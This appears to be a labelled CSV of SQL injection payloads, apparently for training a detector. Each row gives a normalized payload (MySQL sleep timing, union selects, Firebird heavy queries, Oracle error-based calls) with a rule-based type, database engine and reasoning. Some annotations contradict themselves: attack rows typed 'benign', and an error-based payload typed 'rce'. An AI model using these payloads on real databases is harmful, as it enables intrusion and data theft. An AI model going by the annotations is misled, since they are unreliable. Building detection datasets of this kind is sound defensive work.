row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3402,"1' ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
3403,"1"" ) ) and make_set ( 8266 = 9226,9226 ) and ( ( ""omjx"" like ""omjx",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
3404,1'|| ( select 'oxdh' where 6967 = 6967 and sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
3405,select ( case when ( 5698 = 3453 ) then 5698 else 1/ ( select 0 ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3406,"-5776%' union all select 3075,3075,3075,3075,3075--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3407,"1' ) ) as oldh where 9551 = 9551 union all select null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3408,1 rlike sleep ( 5 ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3409,1 ) rlike ( select ( case when ( 5477 = 7492 ) then 1 else 0x28 end ) ) and ( 4427 = 4427,1,,boolean_blind,generic,0.95,") and (, rlike  detected — boolean_blind injection (priority 8) on generic",rule-based
3410,"1"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""sckh"" = ""sckh",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3411,"1"" ) where 1607 = 1607",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3412,1%' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( '%' = ',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3413,"-4194"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""ddbc"" like ""ddbc",1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
3414,"1 ) ) as rual where 4649 = 4649 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3415,"1%"" ) ) union all select null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3416,1'+ ( select 'czpg' where 6627 = 6627 and 2006 = 2006,1,,boolean_blind,generic,0.95,6627 = 6627 and detected — boolean_blind injection (priority 8) on generic,rule-based
3417,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( ""%"" = """,1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
3418,1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( 'zqiw' = 'zqiw,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3419,-1564' ) order by 1--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
